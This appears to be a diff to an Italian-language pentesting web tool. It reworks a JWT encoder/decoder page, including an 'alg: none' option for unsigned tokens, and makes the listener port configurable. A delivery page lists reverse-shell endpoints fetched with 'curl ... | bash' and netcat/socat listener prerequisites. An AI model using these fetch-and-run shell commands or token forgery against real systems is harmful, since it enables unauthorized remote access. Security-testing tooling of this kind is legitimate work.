@@ -31,11 +31,19 @@ SEALSAY_FILE = PROJECT_ROOT / "sealion_say.txt"
 _server: socketserver.TCPServer | None = None
 _thread: threading.Thread | None = None
 _lhost: str = ""
-_lport: int = 4444
+_lport: int = 2727
 
 _log_entries: list[dict[str, str]] = []
 _log_lock = threading.Lock()
 _LOG_MAX = 500
+
+
+def set_lport(port: int) -> str:
+    global _lport
+    if not (1 <= port <= 65535):
+        return f"Porta non valida: {port} (1-65535)"
+    _lport = port
+    return f"LPORT aggiornato a {_lport}"
 
 
 def get_default_ip() -> str:
@@ -1568,94 +1576,157 @@ def _page_jwt() -> str:
     body = """\
 <div class="container">
 <div class="breadcrumb"><a href="/">Home</a> <span>/</span> JWT</div>
-<div class="page-title">JWT Encoder / Decoder</div>
-<div class="page-sub">Decodifica e crea JSON Web Token — tutto lato client</div>
+<div style="display:flex;align-items:center;gap:16px;margin-bottom:4px">
+<div class="page-title" style="margin:0">JWT</div>
+<div id="jwt-tabs" style="display:flex;gap:2px;background:var(--surface);border-radius:6px;padding:2px;border:1px solid var(--border)">
+<button class="jt-tab active" data-tab="decode" onclick="switchTab('decode')">Decoder</button>
+<button class="jt-tab" data-tab="encode" onclick="switchTab('encode')">Encoder</button>
+</div>
+<div id="jwt-badge" style="margin-left:auto;font-size:12px;padding:4px 10px;border-radius:4px;display:none"></div>
+</div>
+<div class="page-sub">Decodifica, modifica e crea JSON Web Token</div>
 
-<div style="display:flex;gap:20px;margin-top:20px;flex-wrap:wrap;align-items:flex-start">
+<style>
+.jt-tab{background:none;border:none;color:var(--text2);padding:6px 16px;border-radius:4px;
+  cursor:pointer;font-size:13px;font-weight:500;transition:all .15s}
+.jt-tab.active{background:var(--accent);color:#fff}
+.jt-tab:hover:not(.active){color:var(--text)}
+.jwt-wrap{display:flex;gap:0;margin-top:16px;border:1px solid var(--border);border-radius:8px;overflow:hidden;min-height:480px}
+.jwt-left,.jwt-right{flex:1;min-width:0}
+.jwt-left{background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column}
+.jwt-right{background:var(--bg);display:flex;flex-direction:column}
+.jwt-panel-head{padding:12px 16px;font-size:11px;text-transform:uppercase;letter-spacing:1px;
+  color:var(--text2);font-weight:600;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
+.jwt-panel-head .badge{font-size:10px;padding:2px 8px;border-radius:3px;text-transform:none;letter-spacing:0}
+.jwt-encoded{flex:1;padding:16px;overflow:auto}
+.jwt-encoded textarea{width:100%;height:100%;min-height:400px;background:transparent;border:none;
+  color:var(--text);font-family:'SFMono-Regular',Consolas,monospace;font-size:14px;line-height:1.7;
+  resize:none;outline:none;word-break:break-all;box-sizing:border-box}
+.jwt-colored{font-family:'SFMono-Regular',Consolas,monospace;font-size:14px;line-height:1.7;
+  word-break:break-all;cursor:text;min-height:400px;outline:none;white-space:pre-wrap}
+.jwt-colored .jc-h{color:#fb015b}.jwt-colored .jc-d{color:var(--text2)}
+.jwt-colored .jc-p{color:#d63aff}.jwt-colored .jc-s{color:#00b9f1}
+.jwt-section{padding:16px;border-bottom:1px solid var(--border)}
+.jwt-section:last-child{border-bottom:none}
+.jwt-section-head{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+.jwt-section-head .dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+.jwt-section-head .lbl{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text2);font-weight:600}
+.jwt-section textarea{width:100%;background:var(--surface);color:var(--text);border:1px solid var(--border);
+  border-radius:6px;padding:10px 12px;font-family:'SFMono-Regular',Consolas,monospace;font-size:13px;
+  line-height:1.5;resize:vertical;outline:none;box-sizing:border-box;tab-size:2}
+.jwt-section textarea:focus{border-color:var(--accent)}
+.jwt-ts{font-size:11px;color:var(--text2);margin-top:8px;line-height:1.7}
+.jwt-ts .expired{color:var(--red)}.jwt-ts .valid{color:var(--green)}
+.jwt-sig-box{display:flex;gap:8px;align-items:center;margin-top:8px}
+.jwt-sig-box input{flex:1;background:var(--surface);color:var(--text);border:1px solid var(--border);
+  border-radius:4px;padding:7px 10px;font-family:monospace;font-size:12px;outline:none}
+.jwt-sig-box input:focus{border-color:var(--accent)}
+.jwt-sig-verify{font-size:12px;margin-top:6px;min-height:18px}
+.jwt-alg-row{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
+.jwt-alg-btn{padding:5px 12px;border-radius:4px;font-size:11px;font-weight:600;cursor:pointer;
+  border:1px solid var(--border);background:var(--surface);color:var(--text2);transition:all .15s}
+.jwt-alg-btn:hover{border-color:var(--accent);color:var(--text)}
+.jwt-alg-btn.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.jwt-alg-btn.warn{background:#332800;color:#d29922;border-color:#554400}
+.jwt-alg-btn.warn:hover{background:#443300}
+.jwt-copy-bar{display:flex;align-items:center;gap:8px;padding:10px 16px;border-top:1px solid var(--border);background:var(--surface2)}
+.jwt-copy-btn{background:var(--surface);color:var(--accent);border:1px solid var(--border);
+  border-radius:4px;padding:5px 14px;font-size:12px;cursor:pointer;margin-left:auto}
+.jwt-copy-btn:hover{background:var(--border)}
+@media(max-width:800px){.jwt-wrap{flex-direction:column}.jwt-left{border-right:none;border-bottom:1px solid var(--border)}}
+</style>
 
-<div style="flex:1;min-width:340px">
-<h3 style="color:var(--text);margin:0 0 10px">Decode</h3>
-<textarea id="jwt-in" rows="4" spellcheck="false"
-  placeholder="Incolla un JWT qui (header.payload.signature)"
-  style="width:100%;background:var(--surface);color:var(--text);border:1px solid var(--border);
-  border-radius:6px;padding:10px;font-family:monospace;font-size:13px;resize:vertical;box-sizing:border-box"></textarea>
-<div id="jwt-err" style="color:#e55;font-size:12px;min-height:18px;margin:4px 0"></div>
-
-<div class="delivery-card" style="margin-top:8px">
-<div class="dc-header"><span class="dc-endpoint">Header</span><span class="dc-title" id="jwt-alg"></span></div>
-<pre id="jwt-header" style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:13px;color:var(--text);
-  background:var(--bg);padding:10px;border-radius:4px;min-height:20px"></pre>
+<!-- DECODER VIEW -->
+<div id="view-decode">
+<div class="jwt-wrap">
+<div class="jwt-left">
+  <div class="jwt-panel-head">Encoded Token
+    <button class="jwt-copy-btn" style="margin-left:auto;padding:3px 10px;font-size:11px" onclick="copyEncoded()">Copia</button>
+  </div>
+  <div class="jwt-encoded">
+    <div id="jwt-colored" class="jwt-colored" contenteditable="false"></div>
+    <textarea id="jwt-in" spellcheck="false" placeholder="Incolla un JWT qui..."></textarea>
+  </div>
+</div>
+<div class="jwt-right">
+  <div class="jwt-panel-head">Decoded
+    <span id="jwt-err" style="color:var(--red);font-size:12px;text-transform:none;letter-spacing:0"></span>
+  </div>
+  <div class="jwt-section">
+    <div class="jwt-section-head"><span class="dot" style="background:#fb015b"></span><span class="lbl">Header</span>
+      <span id="jwt-alg" style="font-size:11px;color:var(--text2);margin-left:auto"></span></div>
+    <textarea id="jwt-header" rows="4" spellcheck="false"></textarea>
+  </div>
+  <div class="jwt-section">
+    <div class="jwt-section-head"><span class="dot" style="background:#d63aff"></span><span class="lbl">Payload</span>
+      <span id="jwt-sub" style="font-size:11px;color:var(--text2);margin-left:auto"></span></div>
+    <textarea id="jwt-payload" rows="8" spellcheck="false"></textarea>
+    <div id="jwt-times" class="jwt-ts"></div>
+  </div>
+  <div class="jwt-section">
+    <div class="jwt-section-head"><span class="dot" style="background:#00b9f1"></span><span class="lbl">Verify Signature</span></div>
+    <div class="jwt-alg-row">
+      <button class="jwt-alg-btn active" data-alg="HS256" onclick="setAlg(this)">HS256</button>
+      <button class="jwt-alg-btn" data-alg="HS384" onclick="setAlg(this)">HS384</button>
+      <button class="jwt-alg-btn" data-alg="HS512" onclick="setAlg(this)">HS512</button>
+      <button class="jwt-alg-btn warn" data-alg="none" onclick="setAlg(this)">none</button>
+    </div>
+    <div class="jwt-sig-box">
+      <input id="jwt-secret" type="text" placeholder="Secret key" value="secret">
+      <button class="jwt-copy-btn" style="margin-left:0" onclick="doVerify()">Verifica</button>
+    </div>
+    <div id="jwt-verify" class="jwt-sig-verify"></div>
+  </div>
+</div>
+</div>
 </div>
 
-<div class="delivery-card" style="margin-top:10px">
-<div class="dc-header"><span class="dc-endpoint">Payload</span><span class="dc-title" id="jwt-sub"></span></div>
-<pre id="jwt-payload" style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:13px;color:var(--text);
-  background:var(--bg);padding:10px;border-radius:4px;min-height:20px"></pre>
-<div id="jwt-times" style="font-size:11px;color:var(--text2);margin-top:6px"></div>
+<!-- ENCODER VIEW -->
+<div id="view-encode" style="display:none">
+<div class="jwt-wrap">
+<div class="jwt-left">
+  <div class="jwt-panel-head">Build Token</div>
+  <div style="flex:1;display:flex;flex-direction:column">
+    <div class="jwt-section" style="flex:0">
+      <div class="jwt-section-head"><span class="dot" style="background:#fb015b"></span><span class="lbl">Header</span></div>
+      <textarea id="enc-header" rows="3" spellcheck="false">{"alg":"HS256","typ":"JWT"}</textarea>
+    </div>
+    <div class="jwt-section" style="flex:1">
+      <div class="jwt-section-head"><span class="dot" style="background:#d63aff"></span><span class="lbl">Payload</span></div>
+      <textarea id="enc-payload" rows="8" spellcheck="false">{"sub":"1","name":"test","iat":0}</textarea>
+    </div>
+    <div class="jwt-section" style="flex:0">
+      <div class="jwt-section-head"><span class="dot" style="background:#00b9f1"></span><span class="lbl">Signature</span></div>
+      <div class="jwt-alg-row">
+        <button class="jwt-alg-btn active" data-alg="HS256" onclick="setEncAlg(this)">HS256</button>
+        <button class="jwt-alg-btn" data-alg="HS384" onclick="setEncAlg(this)">HS384</button>
+        <button class="jwt-alg-btn" data-alg="HS512" onclick="setEncAlg(this)">HS512</button>
+        <button class="jwt-alg-btn warn" data-alg="none" onclick="setEncAlg(this)">none</button>
+      </div>
+      <div class="jwt-sig-box" style="margin-top:8px">
+        <input id="enc-secret" type="text" value="secret" placeholder="Secret key">
+      </div>
+    </div>
+  </div>
 </div>
-
-<div class="delivery-card" style="margin-top:10px">
-<div class="dc-header"><span class="dc-endpoint">Signature</span></div>
-<pre id="jwt-sig" style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:12px;color:var(--text2);
-  background:var(--bg);padding:10px;border-radius:4px;min-height:20px"></pre>
-<div style="margin-top:6px;display:flex;gap:8px;align-items:center">
-<input id="jwt-secret" type="text" placeholder="Secret (per verifica HMAC)"
-  style="flex:1;background:var(--surface);color:var(--text);border:1px solid var(--border);
-  border-radius:4px;padding:6px 8px;font-family:monospace;font-size:12px">
-<button onclick="verifyHMAC()" class="btn btn-primary" style="padding:6px 14px;font-size:12px">Verifica</button>
+<div class="jwt-right">
+  <div class="jwt-panel-head">Generated Token
+    <button class="jwt-copy-btn" style="margin-left:auto;padding:3px 10px;font-size:11px" onclick="copyGenerated()">Copia</button>
+  </div>
+  <div class="jwt-encoded" style="display:flex;flex-direction:column">
+    <div id="enc-colored" class="jwt-colored" style="flex:1"></div>
+    <div id="enc-err" style="color:var(--red);font-size:12px;padding:0 0 8px;min-height:18px"></div>
+  </div>
 </div>
-<div id="jwt-verify" style="font-size:12px;min-height:18px;margin-top:4px"></div>
-</div>
-</div>
-
-<div style="flex:1;min-width:340px">
-<h3 style="color:var(--text);margin:0 0 10px">Encode</h3>
-<label style="font-size:12px;color:var(--text2)">Header JSON</label>
-<textarea id="enc-header" rows="3" spellcheck="false"
-  style="width:100%;background:var(--surface);color:var(--text);border:1px solid var(--border);
-  border-radius:6px;padding:10px;font-family:monospace;font-size:13px;resize:vertical;box-sizing:border-box;margin-top:4px">{"alg":"HS256","typ":"JWT"}</textarea>
-
-<label style="font-size:12px;color:var(--text2);margin-top:10px;display:block">Payload JSON</label>
-<textarea id="enc-payload" rows="5" spellcheck="false"
-  style="width:100%;background:var(--surface);color:var(--text);border:1px solid var(--border);
-  border-radius:6px;padding:10px;font-family:monospace;font-size:13px;resize:vertical;box-sizing:border-box;margin-top:4px">{"sub":"1","name":"test","iat":0}</textarea>
-
-<label style="font-size:12px;color:var(--text2);margin-top:10px;display:block">Secret / Key</label>
-<input id="enc-secret" type="text" value="secret"
-  style="width:100%;background:var(--surface);color:var(--text);border:1px solid var(--border);
-  border-radius:4px;padding:8px 10px;font-family:monospace;font-size:13px;margin-top:4px;box-sizing:border-box">
-
-<div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
-<button onclick="encode('HS256')" class="btn btn-primary" style="padding:8px 16px;font-size:13px">HS256</button>
-<button onclick="encode('HS384')" class="btn" style="padding:8px 16px;font-size:13px;background:var(--surface);color:var(--text);border:1px solid var(--border)">HS384</button>
-<button onclick="encode('HS512')" class="btn" style="padding:8px 16px;font-size:13px;background:var(--surface);color:var(--text);border:1px solid var(--border)">HS512</button>
-<button onclick="encode('none')" class="btn" style="padding:8px 16px;font-size:13px;background:#552;color:#ec3;border:1px solid #883">alg: none</button>
-</div>
-<div id="enc-err" style="color:#e55;font-size:12px;min-height:18px;margin-top:6px"></div>
-
-<div class="delivery-card" style="margin-top:8px">
-<div class="dc-header"><span class="dc-endpoint">Token</span>
-<button onclick="copyToken()" style="margin-left:auto;background:var(--surface);color:var(--accent);
-  border:1px solid var(--border);border-radius:4px;padding:3px 10px;font-size:11px;cursor:pointer">Copia</button>
-</div>
-<pre id="enc-out" style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:13px;color:var(--accent);
-  background:var(--bg);padding:10px;border-radius:4px;min-height:30px;cursor:text;user-select:all"></pre>
 </div>
 </div>
 
-</div>
 </div>
 <script>
 (function(){
-  var inp=document.getElementById('jwt-in');
-  var errEl=document.getElementById('jwt-err');
-  var headerEl=document.getElementById('jwt-header');
-  var payloadEl=document.getElementById('jwt-payload');
-  var sigEl=document.getElementById('jwt-sig');
-  var algEl=document.getElementById('jwt-alg');
-  var subEl=document.getElementById('jwt-sub');
-  var timesEl=document.getElementById('jwt-times');
-  var verifyEl=document.getElementById('jwt-verify');
+  var activeTab='decode';
+  var decAlg='HS256';
+  var encAlg='HS256';
 
   function b64uDec(s){
     s=s.replace(/-/g,'+').replace(/_/g,'/');
@@ -1663,7 +1734,7 @@ def _page_jwt() -> str:
     return atob(s);
   }
   function b64uEnc(s){
-    return btoa(s).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');
+    return btoa(unescape(encodeURIComponent(s))).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');
   }
   function u8b64u(u8){
     var bin='';for(var i=0;i<u8.length;i++)bin+=String.fromCharCode(u8[i]);
@@ -1676,99 +1747,215 @@ def _page_jwt() -> str:
     return d.toISOString().replace('T',' ').replace(/\\.\\d+Z/,' UTC');
   }
 
-  function decode(){
-    errEl.textContent='';headerEl.textContent='';payloadEl.textContent='';
-    sigEl.textContent='';algEl.textContent='';subEl.textContent='';timesEl.innerHTML='';verifyEl.textContent='';
-    var raw=inp.value.trim();if(!raw)return;
+  var algMap={'HS256':'SHA-256','HS384':'SHA-384','HS512':'SHA-512'};
+  var inp=document.getElementById('jwt-in');
+  var colored=document.getElementById('jwt-colored');
+  var errEl=document.getElementById('jwt-err');
+  var headerEl=document.getElementById('jwt-header');
+  var payloadEl=document.getElementById('jwt-payload');
+  var algEl=document.getElementById('jwt-alg');
+  var subEl=document.getElementById('jwt-sub');
+  var timesEl=document.getElementById('jwt-times');
+  var verifyEl=document.getElementById('jwt-verify');
+  var badge=document.getElementById('jwt-badge');
+  var fromRight=false;
+
+  window.switchTab=function(tab){
+    activeTab=tab;
+    document.querySelectorAll('.jt-tab').forEach(function(b){
+      b.classList.toggle('active',b.dataset.tab===tab);
+    });
+    document.getElementById('view-decode').style.display=tab==='decode'?'':'none';
+    document.getElementById('view-encode').style.display=tab==='encode'?'':'none';
+    if(tab==='encode')buildEncoder();
+  };
+
+  function colorize(raw){
     var parts=raw.split('.');
-    if(parts.length<2||parts.length>3){errEl.textContent='Formato non valido (attesi 2-3 segmenti separati da punto)';return;}
+    if(parts.length<2){colored.textContent=raw;return;}
+    colored.innerHTML='<span class="jc-h">'+esc(parts[0])+'</span>'+
+      '<span class="jc-d">.</span><span class="jc-p">'+esc(parts[1])+'</span>'+
+      (parts.length>2?'<span class="jc-d">.</span><span class="jc-s">'+esc(parts[2])+'</span>':'');
+  }
+
+  function showBadge(ok,text){
+    badge.style.display='';
+    badge.textContent=text;
+    if(ok){badge.style.background='rgba(63,185,80,.15)';badge.style.color='var(--green)';badge.style.border='1px solid rgba(63,185,80,.3)';}
+    else{badge.style.background='rgba(248,81,73,.12)';badge.style.color='var(--red)';badge.style.border='1px solid rgba(248,81,73,.3)';}
+  }
+
+  function decode(){
+    errEl.textContent='';algEl.textContent='';subEl.textContent='';timesEl.innerHTML='';verifyEl.textContent='';
+    badge.style.display='none';
+    var raw=inp.value.trim();
+    colorize(raw);
+    if(!raw){headerEl.value='';payloadEl.value='';return;}
+    var parts=raw.split('.');
+    if(parts.length<2||parts.length>3){errEl.textContent='Token non valido';headerEl.value='';payloadEl.value='';return;}
     try{
       var hdr=JSON.parse(b64uDec(parts[0]));
-      headerEl.textContent=JSON.stringify(hdr,null,2);
-      algEl.textContent=hdr.alg||'';
-    }catch(e){errEl.textContent='Header non decodificabile: '+e.message;return;}
+      if(!fromRight)headerEl.value=JSON.stringify(hdr,null,2);
+      algEl.textContent=hdr.alg||'none';
+      if(hdr.alg&&algMap[hdr.alg]){
+        document.querySelectorAll('#view-decode .jwt-alg-btn').forEach(function(b){
+          b.classList.toggle('active',b.dataset.alg===hdr.alg);
+        });
+        decAlg=hdr.alg;
+      }
+    }catch(e){errEl.textContent='Header: '+e.message;return;}
     try{
       var pay=JSON.parse(b64uDec(parts[1]));
-      payloadEl.textContent=JSON.stringify(pay,null,2);
+      if(!fromRight)payloadEl.value=JSON.stringify(pay,null,2);
       if(pay.sub)subEl.textContent='sub: '+pay.sub;
       var ts=[];
       if(pay.iat!=null){var f=fmtTs(pay.iat);if(f)ts.push('iat (issued): '+f);}
       if(pay.exp!=null){
         var f=fmtTs(pay.exp);if(f){
           var now=Math.floor(Date.now()/1000);
-          var exp=pay.exp<now?' (SCADUTO)':' (valido)';
-          ts.push('exp (expires): '+f+exp);
+          if(pay.exp<now)ts.push('<span class="expired">exp (expired): '+esc(f)+'</span>');
+          else ts.push('<span class="valid">exp (valid): '+esc(f)+'</span>');
         }
       }
-      if(pay.nbf!=null){var f=fmtTs(pay.nbf);if(f)ts.push('nbf (not before): '+f);}
-      if(ts.length)timesEl.innerHTML=ts.map(function(t){return esc(t);}).join('<br>');
-    }catch(e){errEl.textContent='Payload non decodificabile: '+e.message;return;}
-    if(parts.length===3&&parts[2]){sigEl.textContent=parts[2];}
-    else{sigEl.textContent='(nessuna firma)';}
+      if(pay.nbf!=null){var f=fmtTs(pay.nbf);if(f)ts.push('nbf (not before): '+esc(f));}
+      if(ts.length)timesEl.innerHTML=ts.join('<br>');
+    }catch(e){errEl.textContent='Payload: '+e.message;return;}
+    showBadge(true,'Valid JWT');
   }
 
-  inp.addEventListener('input',decode);
-
-  var algMap={'HS256':'SHA-256','HS384':'SHA-384','HS512':'SHA-512'};
-
-  window.verifyHMAC=function(){
-    verifyEl.textContent='';verifyEl.style.color='';
-    var raw=inp.value.trim();if(!raw){verifyEl.textContent='Nessun token da verificare';verifyEl.style.color='#e55';return;}
-    var sec=document.getElementById('jwt-secret').value;
-    if(!sec){verifyEl.textContent='Inserisci un secret';verifyEl.style.color='#e55';return;}
-    var parts=raw.split('.');if(parts.length!==3){verifyEl.textContent='Token non valido';verifyEl.style.color='#e55';return;}
-    try{var hdr=JSON.parse(b64uDec(parts[0]));}catch(e){verifyEl.textContent='Header non valido';verifyEl.style.color='#e55';return;}
-    var ha=algMap[hdr.alg];
-    if(!ha){verifyEl.textContent='Algoritmo '+hdr.alg+' non verificabile (solo HMAC)';verifyEl.style.color='var(--text2)';return;}
-    var te=new TextEncoder();
-    var data=te.encode(parts[0]+'.'+parts[1]);
-    var keyData=te.encode(sec);
-    crypto.subtle.importKey('raw',keyData,{name:'HMAC',hash:ha},false,['sign'])
-    .then(function(key){return crypto.subtle.sign('HMAC',key,data);})
-    .then(function(sig){
-      var computed=u8b64u(new Uint8Array(sig));
-      if(computed===parts[2]){
-        verifyEl.textContent='Firma VALIDA';verifyEl.style.color='var(--green)';
-      }else{
-        verifyEl.textContent='Firma NON VALIDA';verifyEl.style.color='#e55';
+  function rebuildFromRight(){
+    fromRight=true;
+    try{
+      var hdrTxt=headerEl.value.trim();
+      var payTxt=payloadEl.value.trim();
+      JSON.parse(hdrTxt);JSON.parse(payTxt);
+      var h=b64uEnc(hdrTxt);
+      var p=b64uEnc(payTxt);
+      var sec=document.getElementById('jwt-secret').value;
+      if(decAlg==='none'){
+        inp.value=h+'.'+p+'.';
+        decode();fromRight=false;return;
       }
-    })
-    .catch(function(e){verifyEl.textContent='Errore: '+e.message;verifyEl.style.color='#e55';});
+      var ha=algMap[decAlg];
+      if(!ha||!sec){inp.value=h+'.'+p+'.';decode();fromRight=false;return;}
+      var te=new TextEncoder();
+      var unsigned=h+'.'+p;
+      crypto.subtle.importKey('raw',te.encode(sec),{name:'HMAC',hash:ha},false,['sign'])
+      .then(function(key){return crypto.subtle.sign('HMAC',key,te.encode(unsigned));})
+      .then(function(sig){
+        inp.value=unsigned+'.'+u8b64u(new Uint8Array(sig));
+        decode();fromRight=false;
+      });
+    }catch(e){fromRight=false;}
+  }
+
+  inp.addEventListener('input',function(){fromRight=false;decode();});
+  headerEl.addEventListener('input',rebuildFromRight);
+  payloadEl.addEventListener('input',rebuildFromRight);
+
+  window.setAlg=function(btn){
+    document.querySelectorAll('#view-decode .jwt-alg-btn').forEach(function(b){b.classList.remove('active');});
+    btn.classList.add('active');
+    decAlg=btn.dataset.alg;
+    if(headerEl.value.trim()){
+      try{
+        var h=JSON.parse(headerEl.value);
+        if(decAlg==='none')delete h.alg;else h.alg=decAlg;
+        headerEl.value=JSON.stringify(h,null,2);
+        rebuildFromRight();
+      }catch(e){}
+    }
   };
 
-  window.encode=function(alg){
-    var eErr=document.getElementById('enc-err');
-    var out=document.getElementById('enc-out');
-    eErr.textContent='';out.textContent='';
-    var hdrTxt=document.getElementById('enc-header').value.trim();
-    var payTxt=document.getElementById('enc-payload').value.trim();
-    try{JSON.parse(hdrTxt);}catch(e){eErr.textContent='Header JSON non valido: '+e.message;return;}
-    try{JSON.parse(payTxt);}catch(e){eErr.textContent='Payload JSON non valido: '+e.message;return;}
-    var hdrObj=JSON.parse(hdrTxt);
-    hdrObj.alg=alg;if(alg==='none')delete hdrObj.alg;else hdrObj.typ='JWT';
-    var h=b64uEnc(JSON.stringify(hdrObj));
+  window.doVerify=function(){
+    verifyEl.textContent='';verifyEl.style.color='';
+    var raw=inp.value.trim();
+    if(!raw){verifyEl.textContent='Nessun token';verifyEl.style.color='var(--red)';return;}
+    var sec=document.getElementById('jwt-secret').value;
+    if(!sec){verifyEl.textContent='Inserisci un secret';verifyEl.style.color='var(--red)';return;}
+    var parts=raw.split('.');if(parts.length!==3){verifyEl.textContent='Token incompleto';verifyEl.style.color='var(--red)';return;}
+    try{var hdr=JSON.parse(b64uDec(parts[0]));}catch(e){verifyEl.textContent='Header non valido';verifyEl.style.color='var(--red)';return;}
+    var ha=algMap[hdr.alg];
+    if(!ha){verifyEl.textContent=hdr.alg+' non verificabile (solo HMAC)';verifyEl.style.color='var(--text2)';return;}
+    var te=new TextEncoder();
+    crypto.subtle.importKey('raw',te.encode(sec),{name:'HMAC',hash:ha},false,['sign'])
+    .then(function(key){return crypto.subtle.sign('HMAC',key,te.encode(parts[0]+'.'+parts[1]));})
+    .then(function(sig){
+      var ok=u8b64u(new Uint8Array(sig))===parts[2];
+      verifyEl.textContent=ok?'Firma VALIDA':'Firma NON VALIDA';
+      verifyEl.style.color=ok?'var(--green)':'var(--red)';
+      showBadge(ok,ok?'Signature Verified':'Invalid Signature');
+    });
+  };
+
+  window.copyEncoded=function(){
+    var t=inp.value.trim();if(!t)return;
+    navigator.clipboard.writeText(t).then(function(){
+      var b=event.target;b.textContent='Copiato!';setTimeout(function(){b.textContent='Copia';},1200);
+    });
+  };
+
+  /* ---- ENCODER ---- */
+  var encHeaderEl=document.getElementById('enc-header');
+  var encPayloadEl=document.getElementById('enc-payload');
+  var encSecretEl=document.getElementById('enc-secret');
+  var encColored=document.getElementById('enc-colored');
+  var encErr=document.getElementById('enc-err');
+
+  window.setEncAlg=function(btn){
+    document.querySelectorAll('#view-encode .jwt-alg-btn').forEach(function(b){b.classList.remove('active');});
+    btn.classList.add('active');
+    encAlg=btn.dataset.alg;
+    try{
+      var h=JSON.parse(encHeaderEl.value);
+      if(encAlg==='none'){delete h.alg;h.typ='JWT';}
+      else{h.alg=encAlg;h.typ='JWT';}
+      encHeaderEl.value=JSON.stringify(h,null,2);
+    }catch(e){}
+    buildEncoder();
+  };
+
+  function buildEncoder(){
+    encErr.textContent='';encColored.innerHTML='';
+    var hdrTxt=encHeaderEl.value.trim();
+    var payTxt=encPayloadEl.value.trim();
+    try{JSON.parse(hdrTxt);}catch(e){encErr.textContent='Header JSON non valido';return;}
+    try{JSON.parse(payTxt);}catch(e){encErr.textContent='Payload JSON non valido';return;}
+    var hObj=JSON.parse(hdrTxt);
+    if(encAlg==='none')delete hObj.alg;else{hObj.alg=encAlg;hObj.typ='JWT';}
+    var h=b64uEnc(JSON.stringify(hObj));
     var p=b64uEnc(payTxt);
     var unsigned=h+'.'+p;
-    if(alg==='none'){
-      out.textContent=unsigned+'.';return;
+    if(encAlg==='none'){
+      encColored.innerHTML='<span class="jc-h">'+esc(h)+'</span><span class="jc-d">.</span><span class="jc-p">'+esc(p)+'</span><span class="jc-d">.</span>';
+      return;
     }
-    var sec=document.getElementById('enc-secret').value;
-    if(!sec){eErr.textContent='Inserisci un secret per firmare';return;}
-    var ha=algMap[alg];if(!ha){eErr.textContent='Algoritmo non supportato';return;}
+    var sec=encSecretEl.value;
+    if(!sec){encErr.textContent='Secret richiesto per la firma';return;}
+    var ha=algMap[encAlg];if(!ha){encErr.textContent='Algoritmo non supportato';return;}
     var te=new TextEncoder();
     crypto.subtle.importKey('raw',te.encode(sec),{name:'HMAC',hash:ha},false,['sign'])
     .then(function(key){return crypto.subtle.sign('HMAC',key,te.encode(unsigned));})
-    .then(function(sig){out.textContent=unsigned+'.'+u8b64u(new Uint8Array(sig));})
-    .catch(function(e){eErr.textContent='Errore firma: '+e.message;});
-  };
+    .then(function(sig){
+      var s=u8b64u(new Uint8Array(sig));
+      encColored.innerHTML='<span class="jc-h">'+esc(h)+'</span><span class="jc-d">.</span><span class="jc-p">'+esc(p)+'</span><span class="jc-d">.</span><span class="jc-s">'+esc(s)+'</span>';
+    })
+    .catch(function(e){encErr.textContent='Errore: '+e.message;});
+  }
+  encHeaderEl.addEventListener('input',buildEncoder);
+  encPayloadEl.addEventListener('input',buildEncoder);
+  encSecretEl.addEventListener('input',buildEncoder);
 
-  window.copyToken=function(){
-    var t=document.getElementById('enc-out').textContent;
-    if(!t)return;
+  window.copyGenerated=function(){
+    var t=encColored.textContent;if(!t)return;
     navigator.clipboard.writeText(t).then(function(){
-      var btn=event.target;btn.textContent='Copiato!';setTimeout(function(){btn.textContent='Copia';},1500);
+      var b=event.target;b.textContent='Copiato!';setTimeout(function(){b.textContent='Copia';},1200);
     });
   };
+
+  var sample='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
+  inp.value=sample;
+  decode();
 })();
 </script>
 """
@@ -1786,16 +1973,16 @@ def _page_delivery() -> str:
     endpoints = [
         ("upgrade", "Upgrade Shell", "Trasforma una shell instabile in una TTY interattiva (socat/python pty)",
          f"curl {base}/upgrade | bash",
-         "Prerequisito: <code>socat file:$(tty),raw,echo=0 tcp-listen:4444</code>"),
+         f"Prerequisito: <code>socat file:$(tty),raw,echo=0 tcp-listen:{_lport}</code>"),
         ("upgrade2", "Upgrade In-Place", "Upgrada la shell corrente a TTY senza aprire nuove connessioni (python pty, script, expect, perl)",
          f"curl {base}/upgrade2 | bash",
          "Nessun prerequisito — eseguilo direttamente nella shell del target"),
         ("rev", "Reverse Shell Bash", "One-liner bash per reverse shell",
          f"curl {base}/rev | bash",
-         "Prerequisito: <code>nc -lvnp 4444</code>"),
+         f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
         ("sh", "Reverse Shell Python", "One-liner Python3 per reverse shell (utile quando bash non ha /dev/tcp)",
          f"curl {base}/sh | bash",
-         "Prerequisito: <code>nc -lvnp 4444</code>"),
+         f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
     ]
     for key, title, desc, curl_cmd, prereq in endpoints:
         ep_cards += f"""<div class="delivery-card">
@@ -1833,7 +2020,15 @@ def _page_delivery() -> str:
     if not file_rows:
         file_rows = '<tr><td colspan="3" style="text-align:center;color:var(--text2);padding:20px">Nessun file in static/</td></tr>'
 
-    lport_info = f"LHOST: <code>{html.escape(_lhost or '?')}</code> &nbsp;|&nbsp; LPORT: <code>{_lport}</code>"
+    lport_info = (
+        f'LHOST: <code>{html.escape(_lhost or "?")}</code> &nbsp;|&nbsp; '
+        f'LPORT: <input type="number" id="lport-val" value="{_lport}" min="1" max="65535" '
+        f'style="width:70px;background:var(--surface);color:var(--accent);border:1px solid var(--border);'
+        f'border-radius:4px;padding:2px 6px;font-family:monospace;font-size:13px;text-align:center">'
+        f' <button onclick="setLport()" style="background:var(--surface);color:var(--accent);'
